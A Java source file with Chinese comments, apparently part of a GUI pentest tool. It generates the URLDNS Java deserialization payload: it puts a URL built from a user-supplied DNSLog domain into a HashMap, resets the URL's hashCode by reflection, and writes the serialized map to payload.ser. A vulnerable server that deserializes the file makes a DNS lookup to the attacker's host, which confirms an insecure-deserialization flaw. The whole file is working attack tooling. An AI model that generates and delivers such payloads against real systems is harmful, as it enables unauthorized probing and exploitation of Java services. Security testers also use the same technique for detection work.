package utils;

import controller.MyController;
import entity.ControllersFactory;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class PayloadGenerator {
    static final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());

    public static boolean PayloadGenerate(String domain) throws Exception {
        if (domain.length() != 0){
            //生成payload
            HashMap map = new HashMap();
            URL url = new URL("http://"+domain);
            Class clas = Class.forName("java.net.URL");
            Field field = clas.getDeclaredField("hashCode");
            field.setAccessible(true); //通过反射将私有属性hashcode设为公有
            field.set(url,123); //将url的hashcode属性改为123使其不等于-1
            map.put(url,"2333"); //这里的value用不上，随便设置
            field.set(url,-1);//put完之后，我们就需要将hashcode属性改回成-1，从而能执行handler.hashcode
            try {
                //序列化
                FileOutputStream outputStream = new FileOutputStream("./payload.ser");
                ObjectOutputStream outputStream1 = new ObjectOutputStream(outputStream);
                outputStream1.writeObject(map);
                outputStream.close();
                outputStream1.close();
                //this.result.appendText("[!] Payload生成成功：payload.ser!\n");
                myController.result.appendText("[+] 测试!\n");
                return true;
            }catch (Exception e){
                e.printStackTrace();
            }
        }else {
            //this.result.appendText("[!] DNSLog地址为空，请重新输入!\n");
            return false;
        }
        return true;
    }
}
